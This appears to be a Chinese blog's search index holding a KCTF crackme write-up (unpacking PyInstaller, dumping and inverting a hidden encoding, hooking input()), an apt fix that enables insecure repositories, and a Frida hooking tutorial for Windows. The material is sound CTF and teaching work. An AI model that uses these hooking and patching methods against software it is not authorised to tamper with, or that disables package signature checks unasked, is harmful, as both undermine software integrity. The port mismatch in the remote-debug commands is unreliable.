[{"categories":["Python"],"content":"2024 KCTF-神秘信号 ","date":"2024-08-26","objectID":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/:0:0","tags":["Python"],"title":"2024 KCTF-神秘信号","uri":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/"},{"categories":["Python"],"content":"题目要求 给出一组公开的用户名以及其对应的序列号,求用户名为KCTF的序列号. #用户名 D7C4197AF0806891 #序列号 D7CHel419lo 7AFWor080ld!6891 ","date":"2024-08-26","objectID":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/:1:0","tags":["Python"],"title":"2024 KCTF-神秘信号","uri":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/"},{"categories":["Python"],"content":"解包反编译 目标程序是PyInstaller打包生成的二进制文件,如下所示: 可以使用pyinstxtractor-ng或pyinstxtractor进行解包. pyc文件的反编译可以使用uncompyle6、decompile3或pycdc 对main.pyc进行反编译,结果如下: import CrackMe print('(账号密码由字母大小写、数字、!、空格组成)') print('请输入账号：') h = input() z = CrackMe.main(h) if len(z) \u003c 20: key = 'dZpKdrsiB6cndrGY' + z else: key = z[0:4] + 'dZpK' + z[4:8] + 'drsi' + z[8:12] + 'B6cn' + z[12:16] + 'drGY' + z[16:] print('请输入验证码：') h = input() m = CrackMe.main(h) if key == m: print('Success') print('Fail') continue 在程序目录中没有发现CrackMe模块, 也就是说CrackMe.main代码被隐藏了. ","date":"2024-08-26","objectID":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/:2:0","tags":["Python"],"title":"2024 KCTF-神秘信号","uri":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/"},{"categories":["Python"],"content":"寻找CrackMe模块 使用Procmon对目标程序进行文件监控,发现加载了其目录下的bz2模块. 我们可以将原_bz2.pyd重命名为_bz2.pyd.src,在其所在目录新建_bz2.py,添加下述代码,查看CrackMe原型. import CrackMe print(CrackMe) 运行目标程序后,输出结果如下: \u003cmodule 'base64' from 'C:\\\\Users\\\\XiaLuoHun\\\\Desktop\\\\main2\\\\main\\\\_internal\\\\base64.pyc'\u003e 没想到,CrackMe模块居然是base64.pyc,对其进行反编译可以看到在base64模块的结尾做了手脚,进行了字节码替换. 我们不用反编译上述代码,直接在_bz2.py中添加下述代码,进行CrackMe.main函数代码Dump import CrackMe import marshal import importlib code = CrackMe.main.__code__ marshal_data = marshal.dumps(code) pyc_data = importlib._bootstrap_external._code_to_timestamp_pyc(code) with open(\"crackme_main.marshal\", \"wb\") as f: f.write(marshal_data) with open(\"crackme_main.pyc\", \"wb\") as f: f.write(pyc_data) 对Dump下来的pyc文件进行反编译,得到CrackMe.main代码如下: encoded_str = '' padding = 0 base64_chars = 'ZQ+U7tSBEKVzyf5coCwb94Dd6raT0eLNin12Hp8mOxFuvMgIPlhRY3WjksqJAXG/' ww = b'' for i in data: i = i ^ 85 ww = ww + i.to_bytes(1, 'little') data = ww for i in range(0, len(data), 3): chunk = data[i:i + 3] # binary_str = ''.join((lambda .0: for byte in .0: # format(byte, '08b'))(chunk)) binary_str = ''.join(format(byte, '08b') for byte in chunk) for j in range(0, len(binary_str), 6): six_bits = binary_str[j:j + 6] if len(six_bits) \u003c 6: padding += 6 - len(six_bits) six_bits += '0' * (6 - len(six_bits)) encoded_str += base64_chars[int(six_bits, 2)] encoded_str += '!' * (padding // 2) for i in range(len(encoded_str) // 2): a = encoded_str[i * 2] b = encoded_str[i * 2 + 1] encoded_str = encoded_str[:i * 2] + b + a + encoded_str[i * 2 + 2:] return encoded_str 反编译出来的结果没有函数声明,结合上下文理解,可得到CrackMe.main代码如下: def crack_main(data): encoded_str = '' padding = 0 base64_chars = 'ZQ+U7tSBEKVzyf5coCwb94Dd6raT0eLNin12Hp8mOxFuvMgIPlhRY3WjksqJAXG/' ww = b'' for i in data: i ^= 85 ww += i.to_bytes(1, 'little') data = ww for i in range(0, len(data), 3): chunk = data[i:i+3] binary_str = ''.join(format(byte, '08b') for byte in chunk) for j in range(0, len(binary_str), 6): six_bits = binary_str[j:j+6] if len(six_bits) \u003c 6: padding += 6 - len(six_bits) six_bits += '0' * (6 - len(six_bits)) encoded_str += base64_chars[int(six_bits, 2)] encoded_str += '!' * (padding // 2) for i in range(len(encoded_str) // 2): a = encoded_str[2 * i] b = encoded_str[2 * i + 1] encoded_str = encoded_str[:2 * i] + b + a + encoded_str[2 * i + 2:] return encoded_str 同时写出上述过程的逆运算代码如下: def crack_main_reverse(encoded_str): base64_chars = 'ZQ+U7tSBEKVzyf5coCwb94Dd6raT0eLNin12Hp8mOxFuvMgIPlhRY3WjksqJAXG/' padding_count = encoded_str.count('!') encoded_str = encoded_str.replace('!', '') decoded_str = '' for i in range(len(encoded_str) // 2): b = encoded_str[2 * i] a = encoded_str[2 * i + 1] decoded_str += a + b if len(encoded_str) % 2 != 0: decoded_str += encoded_str[-1] binary_str = '' for char in decoded_str: index = base64_chars.index(char) binary_str += format(index, '06b') data = bytearray() for i in range(0, len(binary_str) - padding_count * 2, 8): byte = int(binary_str[i:i+8], 2) data.append(byte) for i in range(len(data)): data[i] ^= 85 return bytes(data) ","date":"2024-08-26","objectID":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/:3:0","tags":["Python"],"title":"2024 KCTF-神秘信号","uri":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/"},{"categories":["Python"],"content":"Flag 使用下述代码进行公开用户名以及序列号验证: def crack_main(data): encoded_str = '' padding = 0 base64_chars = 'ZQ+U7tSBEKVzyf5coCwb94Dd6raT0eLNin12Hp8mOxFuvMgIPlhRY3WjksqJAXG/' ww = b'' for i in data: i ^= 85 ww += i.to_bytes(1, 'little') data = ww for i in range(0, len(data), 3): chunk = data[i:i+3] binary_str = ''.join(format(byte, '08b') for byte in chunk) for j in range(0, len(binary_str), 6): six_bits = binary_str[j:j+6] if len(six_bits) \u003c 6: padding += 6 - len(six_bits) six_bits += '0' * (6 - len(six_bits)) encoded_str += base64_chars[int(six_bits, 2)] encoded_str += '!' * (padding // 2) for i in range(len(encoded_str) // 2): a = encoded_str[2 * i] b = encoded_str[2 * i + 1] encoded_str = encoded_str[:2 * i] + b + a + encoded_str[2 * i + 2:] return encoded_str def crack_main_reverse(encoded_str): base64_chars = 'ZQ+U7tSBEKVzyf5coCwb94Dd6raT0eLNin12Hp8mOxFuvMgIPlhRY3WjksqJAXG/' padding_count = encoded_str.count('!') encoded_str = encoded_str.replace('!', '') decoded_str = '' for i in range(len(encoded_str) // 2): b = encoded_str[2 * i] a = encoded_str[2 * i + 1] decoded_str += a + b if len(encoded_str) % 2 != 0: decoded_str += encoded_str[-1] binary_str = '' for char in decoded_str: index = base64_chars.index(char) binary_str += format(index, '06b') data = bytearray() for i in range(0, len(binary_str) - padding_count * 2, 8): byte = int(binary_str[i:i+8], 2) data.append(byte) for i in range(len(data)): data[i] ^= 85 return bytes(data) def convert_key(z): if len(z) \u003c 20: key = 'dZpKdrsiB6cndrGY' + z else: key = z[0:4] + 'dZpK' + z[4:8] + 'drsi' + z[8:12] + 'B6cn' + z[12:16] + 'drGY' + z[16:] return key z = crack_main(b\"D7C4197AF0806891\") key = convert_key(z) m = crack_main(b\"D7CHel419lo 7AFWor080ld!6891\") print(z) print(key) print(m) print(crack_main_reverse(m)) 输出结果如下: D7DED6vCn6boDrp3W6v3Zr!! D7DEdZpKD6vCdrsin6boB6cnDrp3drGYW6v3Zr!! D7DEbBsZD6vCb53xn6bo2ZmODrp3b5YtW6v3Zr!! b'D7CHel419lo 7AFWor080ld!6891' 根据程序流程来说,公开的用户名计算出来的key应该和序列号计算出来的结果相同,但是从结果来看明显不同,如下: key: D7DEdZpKD6vCdrsin6boB6cnDrp3drGYW6v3Zr!! m: D7DEbBsZD6vCb53xn6bo2ZmODrp3b5YtW6v3Zr!! 从上述可以看到main.pyc在运行过程中有地方被修改了, 我们采用排除法,在_bz2.py中添加下述代码,对CrackMe.main函数进行Hook, 查看输入参数和输出参数. import CrackMe import sys origin_crackme_main = CrackMe.main def hook_decompile_crackme_main(data): print(repr(data)) r = origin_crackme_main(data) print(repr(r)) return r CrackMe.main = hook_decompile_crackme_main sys.modules[\"CrackMe\"] = CrackMe 运行目标程序,结果如下: PS C:\\Users\\XiaLuoHun\\Desktop\\main2\\main\u003e .\\main.exe (账号密码由字母大小写、数字、!、空格组成) 请输入账号： D7C4197AF0806891 b'HUIX[cUKF\\\\d\\\\Vdc[' 'oB0ZoUWkQZbkb+K7RZW7iU!!' 请输入验证码： D7CHel419lo 7AFWor080ld!6891 b\"HUIT'0X[c0-lUKF5-\\x1a\\\\d\\\\0(kVdc[\" 'oB0ZdZpKoUWkdrsiQZbkB6cnb+K7drGYRZW7iU!!' Success 从结果可以看到,我们输入的内容被修改了,也就是说input函数有问题.可以在在_bz2.py中添加下述代码,对input函数进行Hook,进一步确认修改点. import builtins old_input = input def hook_input(*args, **kwargs): r = old_input(*args, **kwargs) print(repr(old_input), hex(id(old_input)), repr(r)) return r #print(input.__module__) builtins.input = hook_input 运行目标程序,结果如下: PS C:\\Users\\XiaLuoHun\\Desktop\\main2\\main\u003e .\\main.exe (账号密码由字母大小写、数字、!、空格组成) 请输入账号： D7C4197AF0806891 \u003cbuilt-in function input\u003e 0x1aa7afd0a90 b'HUIX[cUKF\\\\d\\\\Vdc[' 请输入验证码： D7CHel419lo 7AFWor080ld!6891 \u003cbuilt-in function input\u003e 0x1aa7afd0a90 b\"HUIT'0X[c0-lUKF5-\\x1a\\\\d\\\\0(kVdc[\" Success 通过python内置的id函数可以得到PyCFunctionObject结构体地址,其结构定义如下: typedef __int64 Py_ssize_t; typedef PyObject* (*PyCFunction)(PyObject*, PyObject*); typedef PyObject* (*vectorcallfunc)(PyObject* callable, PyObject* const* args, size_t nargsf, PyObject* kwnames); typedef struct _object { Py_ssize_t ob_refcnt; struct _typeobject* ob_type; } PyObject; #define PyObject_HEAD PyObject ob_base; struct PyMethodDef { const char* ml_name; /* The name of the built-in function/method */ PyCFunction ml_meth; /* The C function that implements it */ int ml_flags; /* Combination of METH_xxx flags, which mostly describe the args expected by the C func */ const char* ml_doc; /* The __doc__ attribute, or NULL */ }; typedef struct PyMethod","date":"2024-08-26","objectID":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/:4:0","tags":["Python"],"title":"2024 KCTF-神秘信号","uri":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/"},{"categories":["Python"],"content":"参考链接 2024 KCTF 大赛 | 第四题《神秘信号》设计思路及解析 看雪 2024 KCTF 大赛 第四题 神秘信号 Python源码解析-builtin_function_or_method ","date":"2024-08-26","objectID":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/:5:0","tags":["Python"],"title":"2024 KCTF-神秘信号","uri":"/posts/python/2024kctf-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7/"},{"categories":["那些年遇过的坑"],"content":"在Linux下使用apt update出现下述问题: 可依次使用下述命令解决: echo \"deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\" | tee /etc/apt/sources.list apt update -o Acquire::AllowInsecureRepositories=true -o Acquire::AllowDowngradeToInsecureRepositories=true apt install gnupg gnupg2 gnupg1 apt-key adv --keyserver keyserver.ubuntu.com --recv-keys XXXXXX apt update ","date":"2024-08-20","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/aptupdate%E5%A4%B1%E8%B4%A5/:0:0","tags":["Linux"],"title":"AptUpdate失败","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/aptupdate%E5%A4%B1%E8%B4%A5/"},{"categories":["Win相关"],"content":"Frida是一个跨平台的Hook框架,支持MacOS、Windows、Linux、IOS以及Android等平台,其官网如下: https://github.com/frida/frida ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:0:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"frida-tools frida-tools是一个Python包,提供了一些CLI工具,可通过下述命令进行安装. pip install frida-tools ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:1:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"frida frida命令行工具允许向指定进程进行代码注入,其参数说明如下: 相关命令 说明 -U, –usb 连接到USB设备 -H HOST, –host HOST 连接到指定HOST的frida-server -f TARGET, –file TARGET 以spawn模式执行指定路径程序 -F, –attach-frontmost 附加最前面的应用程序 -p PID, –attach-pid PID 附加指定PID进程 -l SCRIPT, –load SCRIPT 加载脚本 -C USER_CMODULE, –cmodule USER_CMODULE 加载CMODULE -o LOGFILE, –output LOGFILE 输出日志到文件 –runtime {qjs,v8} script运行引擎选择 –debug 开启调试 –pause 以spawn模式运行程序,添加该参数可使其暂停,使用**%resume**可恢复执行 ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:1:1","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"frida-trace frida-trace是一个动态跟踪函数调用的工具,其参数说明如下: 相关命令 说明 -U, –usb 连接到USB设备 -H HOST, –host HOST 连接到指定HOST的frida-server -f TARGET, –file TARGET 以spawn模式执行指定路径程序 -F, –attach-frontmost 附加最前面的应用程序 -p PID, –attach-pid PID 附加指定PID进程 –runtime {qjs,v8} script运行引擎选择 -I MODULE, –include-module MODULE 包含模块 -X MODULE, –exclude-module MODULE 排除模块 -i FUNCTION, –include FUNCTION 包含函数,可使用通配符* -x FUNCTION, –exclude FUNCTION 排除函数 -a MODULE!OFFSET, –add MODULE!OFFSET 添加模块偏移跟踪 -j JAVA_METHOD, –include-java-method JAVA_METHOD 包含Java方法 -J JAVA_METHOD, –exclude-java-method JAVA_METHOD 排除Java方法 -o OUTPUT, –output OUTPUT 输出信息到文件 frida-trace使用示例如下: frida-trace -f \"XXX.exe\" -i \"CreateFile*\" frida-trace -f \"XXX.exe\" -i \"CreateFileW\" frida-trace -f \"XXX.exe\" -i \"CreateFileW\" -X \"KERNEL32.DLL\" frida-trace -f \"XXX.exe\" -a \"kernelbase.dll!0x11DAF0\" frida-trace -f \"XXX.exe\" -a \"kernelbase.dll!0x11DAF0\" -a \"kernel32.dll!0x1EA70\" ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:1:2","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"处理数据类型 ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"字符串读取和分配 字符串分配API如下: API 说明 Memory.allocAnsiString() 分配Ansi字符串(仅限Windows) Memory.allocUtf8String() 分配UTF8字符串 Memory.allocUtf16String() 分配UTF16字符串(仅限Windows) 分配字符串时,一定要将其设置为常量,以避免字符串在某一时刻从内存中清除,示例如下: const myTestString = Memory.allocAnsiString(\"Hello XiaLuoHun!\"); 字符串读取API如下: API 说明 {NativePointer}.readCString() 读取C风格字符串 {NativePointer}.readAnsiString() 读取Ansi字符串 {NativePointer}.readUtf8String() 读取UTF8字符串 {NativePointer}.readUtf16String() 读取UTF16字符串 注意如下: {NativePointer}是一个指针,指向包含字符串的地址. 可以向这些API传递一个数字作为参数,以指定要读取的字节数. 使用示例如下: //myTestString指向Ansi字符串 myTestString.readAnsiString(); //myTestString指向C风格字符串,且字符串长度为1024字节 myTestString.readCString(1024); 接下来使用一个案例来展示字符串读取API的使用. 测试代码如下: #include \u003ciostream\u003e #include \u003cWindows.h\u003e int main() { WCHAR lpBuffer[MAX_PATH]; LPWSTR* lpFilePart{}; DWORD result; result = SearchPathW(NULL, L\"c:\\\\windows\\\\\", NULL, MAX_PATH, lpBuffer, lpFilePart); std::cout \u003c\u003c \"SearchPath retval: \" \u003c\u003c result \u003c\u003c std::endl; } SearchPathW说明如下: DWORD WINAPI SearchPathW( _In_opt_ LPCWSTR lpPath, _In_ LPCWSTR lpFileName, _In_opt_ LPCWSTR lpExtension, _In_ DWORD nBufferLength, _Out_writes_to_opt_(nBufferLength,return + 1) LPWSTR lpBuffer, _Out_opt_ LPWSTR* lpFilePart); Frida Js Hook代码如下: const searchPathPtr = Module.getExportByName(\"KERNELBASE.DLL\", \"SearchPathW\"); Interceptor.attach(searchPathPtr, { onEnter(args) { console.log(\"Output: \" + args[1].readUtf16String()) } }); 与上述等效的TypeScript代码如下: const searchPathPtr:NativePointer = Module.getExportByName(\"KERNELBASE.DLL\", \"SearchPathW\"); class SearchPathW { onEnter(args:NativePointer[]) { console.log(\"Output: \" + args[1].readUtf16String()); } } Interceptor.attach(searchPathPtr, new SearchPathW); 注入命令如下: npm run watch frida -f \"XXX.exe\" -l .\\_agent.js ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:1","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"数字 我们需要知道参数是纯数字类型还是其地址,如果不是内存中的地址,我们不能使用Frida的API处理数字类型,否则会导致目标进程出错. 通过值传递的参考代码如下: int add(int a, int b) { return a + b; } 在Frida中可以使用下述代码进行参数读取: Interceptor.attach(addPtr, { onEnter(args) { console.log(\"a: \" + args[0].toInt32()); console.log(\"b: \" + args[1].toInt32()); }, }); 通过指针传递数值的参考代码如下: //a = 1337, b=7331 int add(int* a, int* b) { return *a + *b; } Frida提供的读取数值API如下: API 说明 {}.readInt() 从给定地址读取整数 {}.readUInt() 从给定地址读取无符号整数 {}.readS8() 从指定地址读取带符号的8位、16位、32位或64位整数 {}.readShort() 从给定地址读取短整数 {}.readFloat() 从给定地址读取浮点数 {}.readDouble() 从给定地址读取双浮点数 {}.readLong() 从给定地址读取长数字 {}.readULong() 从给定地址读取无符号长数字 {}.readUShort() 从给定地址读取无符号短数 {}.readUS8() 从给定地址读取无符号整数 在Frida中可以使用下述代码进行参数读取: Interceptor.attach(addPtr, { onEnter(args) { console.log(\"a: \" + args[0].readInt()); console.log(\"b: \" + args[1].readInt()); }, }); Frida提供的数值写入API如下: API 说明 {}.writeInt() 向给定地址写入整数 {}.writeUInt() 向给定地址写入无符号整数 {}.writeS8() 向给定地址写入带符号的8位、16位、32位或64位整数 {}.writeShort() 向给定地址写入短整数 {}.writeFloat() 向给定地址写入浮点数 {}.writeDouble() 向给定地址写入双浮点数 {}.writeLong() 向给定地址写入长数字 {}.writeULong() 向给定地址写入无符号长数字 {}.writeUShort() 向给定地址写入无符号短数 {}.writeUS8() 向给定地址写入无符号整数 以上述指针传递参考代码为例,Frida可使用下述代码进行参数修改: Interceptor.attach(addPtr, { onEnter(args) { args[0].writeInt(10); args[1].writeInt(20); }, }); ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:2","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"指针 可以使用readPointer() API读取指针指向的地址.当有一个指向结构体的指针需要读取时,这种用法很有用. recvfrom声明如下: ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); Frida代码如下: // ... onEnter(args) { console.log( args[4].readPointer(); ); } // ... ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:3","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"偏移量指针 Frida示例代码如下: var myBaseAddr = Module.findBaseAddress('kernel32.dll'); var myOffsetPtr = myBaseAddr.add(0x76E) console.log(\"myBaseAddr: \"+ myBaseAddr + \"\\nmyOffsetPtr: \" + myOffsetPtr) 上述输出内容如下: myBaseAddr: 0x7ffff0f00000 myOffsetPtr: 0x7ffff0f0076e 如果我们不知道模块名称或者模块名称与预期不符,可以使用Process.enumerateModulesSync() API,该API会返回模块列表.使用示例如下: var modules = Process.enumerateModulesSync(); modules.forEach(function(module) { console.log(\"Name: \" + module.name); console.log(\"Base Address: \" + module.base); console.log(\"Size: \" + module.size); console.log(\"Path: \" + module.path); console.log(\"-------------------------------\"); }); ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:4","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"获取导出函数地址 在Frida中可以通过下述两种方式获取模块导出函数地址: //var MessageBoxA = Module.findExportByName('user32.dll', 'MessageBoxA'); var MessageBoxA = Module.getExportByName('user32.dll', 'MessageBoxA'); console.log(\"MessageBoxA:\", MessageBoxA) 当找不到导出函数地址时: findExportByName返回NULL getExportByName抛异常 故建议使用getExportByName,如果想使用findExportByName,请务必检查返回值. ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:5","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"ArrayBuffer指针 在分配字符串时,返回的是一个指针,拿到这个指针就可以调用read或write API对其内容进行修改. [Local]-\u003e Memory.allocUtf8String('foo') \"0x1e9f5446be0\" 但是对于不返回地址的ArrayBuffer就不同了 [Local]-\u003e array = new ArrayBuffer(10) 0000 00 00 00 00 00 00 00 00 00 00 .......... 这种情况下,可以调用unwrap函数,返回指向ArrayBuffer的第一个元素指针 [Local]-\u003e array.unwrap() \"0x1e9f5447210\" 有时候为了保证脚本的可移植性,需要考虑指针的大小,可以调用下述API返回被检测进程的指针大小 Process.pointerSize ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:6","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"Hexdump Hexdump在给定一个NativePointer或ArrayBuffer时,返回16进制试图,其语法如下: hexdump(address, [, options]) //options值如下: { offset: number, length: number, header: true|false, ansi: true|false, } 使用示例如下: [Local]-\u003e Process.enumerateModules() [ { \"base\": \"0x7ff78ef10000\", \"name\": \"luoDst.exe\", \"path\": \"E:\\\\SoftWareWork\\\\VSWork\\\\luoDst\\\\x64\\\\Debug\\\\luoDst.exe\", \"size\": 2744320 }, //--- ] [Local]-\u003e console.log(hexdump(ptr(0x7ff78ef10000), { offset:0, length:100 })) 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 7ff78ef10000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 7ff78ef10010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 7ff78ef10020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 7ff78ef10030 00 00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00 ................ 7ff78ef10040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 7ff78ef10050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is program canno 7ff78ef10060 74 20 62 65 ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:7","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"释放已分配内存 在调用Memory.alloc API时,当完成有效任务后,如何释放已分配的内存? 最好的做法就是对上述保存alloc地址的变量重新赋值,从而允许Frida释放它.示例如下: [Local]-\u003e t = Memory.alloc(32); \"0x1a482928170\" [Local]-\u003e t.writeUtf8String('Hello XiaLuoHun!') \"0x1a482928170\" [Local]-\u003e console.log(hexdump(t)) 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 1a482928170 48 65 6c 6c 6f 20 58 69 61 4c 75 6f 48 75 6e 21 Hello XiaLuoHun! 1a482928180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 1a482928190 00 00 00 00 00 00 00 00 63 00 00 00 00 00 00 00 ........c....... 1a4829281a0 07 00 00 00 80 01 3e 00 00 00 00 00 02 00 00 00 ......\u003e......... 1a4829281b0 20 81 92 82 a4 01 00 00 10 e8 91 82 a4 01 00 00 ............... 1a4829281c0 f0 23 92 82 a4 01 00 00 40 8b 90 82 a4 01 00 00 .#......@....... 1a4829281d0 00 00 00 00 00 00 00 00 a0 ae a3 82 a4 01 00 00 ................ 1a4829281e0 d0 67 90 82 00 00 00 00 22 70 61 79 6c 6f 61 64 .g......\"payload 1a4829281f0 60 00 00 00 00 00 00 00 73 00 00 00 00 00 00 00 `.......s....... 1a482928200 01 00 00 00 00 01 0c 00 00 00 00 00 00 00 00 00 ................ 1a482928210 70 59 92 82 a4 01 00 00 20 c3 90 82 a4 01 00 00 pY...... ....... 1a482928220 10 95 8f 82 a4 01 00 00 10 70 92 82 a4 01 00 00 .........p...... 1a482928230 00 00 00 00 00 00 00 00 20 f7 8e 82 a4 01 00 00 ........ ....... 1a482928240 88 b1 9a 5d ff 7f 00 00 01 01 00 00 a4 01 00 00 ...]............ 1a482928250 70 82 92 82 a4 01 08 00 00 00 00 00 00 00 00 00 p............... 1a482928260 70 00 00 00 00 00 00 00 63 00 00 00 00 00 00 00 p.......c....... 当t为null时,内存区域值如下: [Local]-\u003e t=null null [Local]-\u003e console.log(hexdump(ptr(0x1a482928170))) 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF 1a482928170 02 00 00 00 62 00 00 00 78 01 fe 80 00 00 00 00 ....b...x....... 1a482928180 00 01 6f 00 00 00 00 00 5b 22 66 72 69 64 61 3a ..o.....[\"frida: 1a482928190 72 70 63 22 2c 20 32 34 2c 20 22 63 61 6c 6c 22 rpc\", 24, \"call\" 1a4829281a0 2c 20 22 66 72 69 64 61 45 76 61 6c 75 61 74 65 , \"fridaEvaluate 1a4829281b0 45 78 70 72 65 73 73 69 6f 6e 22 2c 20 5b 22 63 Expression\", [\"c 1a4829281c0 6f 6e 73 6f 6c 65 2e 6c 6f 67 28 68 65 78 64 75 onsole.log(hexdu 1a4829281d0 6d 70 28 70 74 72 28 30 78 31 61 34 38 32 39 32 mp(ptr(0x1a48292 1a4829281e0 38 31 37 30 29 29 29 22 5d 5d 00 00 00 00 00 00 8170)))\"]]...... 1a4829281f0 90 00 00 00 00 00 00 00 73 00 00 00 00 00 00 00 ........s....... 1a482928200 01 00 00 00 00 01 0c 00 00 00 00 00 00 00 00 00 ................ 1a482928210 70 59 92 82 a4 01 00 00 20 c3 90 82 a4 01 00 00 pY...... ....... 1a482928220 10 95 8f 82 a4 01 00 00 10 70 92 82 a4 01 00 00 .........p...... 1a482928230 00 00 00 00 00 00 00 00 20 f7 8e 82 a4 01 00 00 ........ ....... 1a482928240 88 b1 9a 5d ff 7f 00 00 01 01 00 00 a4 01 00 00 ...]............ 1a482928250 70 82 92 82 a4 01 08 00 00 00 00 00 00 00 00 00 p............... 1a482928260 70 00 00 00 00 00 00 00 63 00 00 00 00 00 00 00 p.......c....... ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:2:8","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"Hook基操 目标进程,测试代码如下: #include \u003cstdio.h\u003e int add(int a, int b) { return a + b; } int main() { int a = 10; int b = 0; scanf(\"%d\", \u0026b); printf(\"%d + %d = %d\\r\\n\", a, b, add(a, b)); a = 200; printf(\"%d + %d = %d\\r\\n\", a, b, add(a, b)); return 0; } Frida修改函数参数以及返回值的代码如下: var addPtr = Process.mainModule.base.add(0x16F920) var addListener = Interceptor.attach(addPtr, { onEnter(args){ //保存参数0原始值 this.arg0 = args[0] //修改参数0值 args[0] = ptr(100) }, onLeave(retvalue){ //打印参数0原始值 //console.log(\"[onLeave] arg0Src:\", this.arg0) //修改返回值 retvalue.replace(1000) //取消Hook addListener.detach() } }) ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:3:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"远程调试 在目标机运行frida server //假设目标机IP为 192.168.59.129 .\\frida-server-Win64.exe -l 0.0.0.0:6666 在本地使用下述命令执行Frida脚本 frida -H 192.168.59.129:8899 -p 6280 -l .\\luoHook.js ","date":"2024-08-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/:4:0","tags":["Frida"],"title":"Frida-Windows","uri":"/posts/windows%E7%9B%B8%E5%85%B3/fridawindows/"},{"categories":["Win相关"],"content":"脚本调试 frida脚本调试示例如下: 